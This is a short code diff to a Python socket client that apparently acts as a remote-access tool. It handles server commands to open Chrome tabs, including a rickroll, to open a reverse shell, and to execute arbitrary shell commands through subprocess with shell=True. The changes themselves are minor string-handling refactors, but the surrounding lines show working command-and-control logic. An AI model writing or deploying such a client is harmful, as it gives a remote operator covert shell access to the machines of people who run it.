@@ -37,6 +37,7 @@ def socketStart():
                 # listen for requests
                 while True:  # while connected to server
                     data = s.recv(1024).decode('utf-8')
+                    data = str(data)
                     if not data:
                         break
                     elif data == 'KILL':
@@ -45,14 +46,14 @@ def socketStart():
                     elif data == 'ROLL':
                         open_chrome(rickroll_URL)
                         print("Server sent rickroll.")
-                    elif str(data).startswith("CHROME"):
+                    elif data.startswith("CHROME"):
                         print("Opening Chrome tab: " + data.split(' ')[1])
                         open_chrome(data.split(' ')[1])
                     elif data == 'RSHELL':
                         print("Opening Reverse Shell...")
                         rshell(s)
                         print("Reverse Shell closed.")
-                    elif str(data).startswith("EXEC"):
+                    elif data.startswith("EXEC"):
                         print("Executing command: " + data.split(' ')[1])
                         output = subprocess.Popen(data.split(' ')[1], shell=True, stdout=subprocess.PIPE,
                                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
